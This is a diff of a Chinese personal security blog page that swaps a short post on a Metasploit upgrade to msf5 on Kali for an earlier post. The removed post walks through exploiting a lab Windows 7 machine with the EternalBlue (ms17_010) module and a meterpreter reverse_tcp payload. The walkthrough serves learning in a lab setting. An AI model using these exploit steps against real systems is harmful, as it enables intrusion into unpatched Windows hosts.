@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>永恒之蓝利用 | 王亮亮</title>
+  <title>msf升级msf5 | 王亮亮</title>
   <meta name="keywords" content=" 渗透 ">
-  <meta name="description" content="永恒之蓝利用 | 王亮亮">
+  <meta name="description" content="msf升级msf5 | 王亮亮">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Foollow your heart">
 <meta name="keywords" content="Testing,Another Tag">
@@ -480,9 +480,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-ms17_010漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-msf升级" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">永恒之蓝利用</h1>
+        <h1 class="article-title">msf升级msf5</h1>
     
     <div class="article-meta">
         
@@ -504,7 +504,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-09-07 15:17:49'>2019-09-07 15:29</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-07 16:14:01'>2019-09-07 17:29</time>
         
     </div>
     <div class="article-meta">
@@ -526,7 +526,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#永恒之蓝"><span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击利用"><span class="toc-text">攻击利用</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#kali更新msf5"><span class="toc-text">kali更新msf5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#升级"><span class="toc-text">升级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#报错提示"><span class="toc-text">报错提示</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -541,8 +541,9 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>利用永恒之蓝(ms17_010)漏洞进行win7内网渗透测试获取权限</p>
-<h1 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h1><p>攻击者：kali 192.168.56.144<br>被攻击者：win7 192.168.56.133<br>nmap -sS 192.168.56.133<br>发现开放445端口对应的运行程序是microsoft-ds<br>启动msf<br>use exploit/windows/smb/ms17_010_eternalblue<br>show option<br>set rhosts 192.168.56.133<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.168.56.144<br>run</p>
+        <h1 id="kali更新msf5"><a href="#kali更新msf5" class="headerlink" title="kali更新msf5"></a>kali更新msf5</h1><p>老的msf找不到最新的漏洞无奈，只好去升级了</p>
+<h1 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h1><p>apt remove metasploit-framework<br>卸载原来的<br>apt-get install metasploit-framework<br>重新安装最新版本</p>
+<h1 id="报错提示"><a href="#报错提示" class="headerlink" title="报错提示"></a>报错提示</h1><p>卸载遇见无法卸载<br>无法获得锁 /var/cache/apt/archives/lock - open (11: 资源暂时不可用)<br>无法对目录 /var/cache/apt/archives/ 加锁<br>强制卸载<br>rm /var/cache/apt/archives/lock</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1119098304@qq.com </span>
@@ -556,12 +557,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>永恒之蓝利用</p>
+    <p><span class="copy-title">文章标题:</span>msf升级msf5</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLiangliang">WLiangliang</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-09-07, 15:29:32</p>
-    <p><span class="copy-title">最后更新:</span>2019-09-07, 15:17:49</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/07/ms17_010漏洞利用/" title="永恒之蓝利用">http://yoursite.com/2019/09/07/ms17_010漏洞利用/</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-07, 17:29:32</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-07, 16:14:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/07/msf升级/" title="msf升级msf5">http://yoursite.com/2019/09/07/msf升级/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
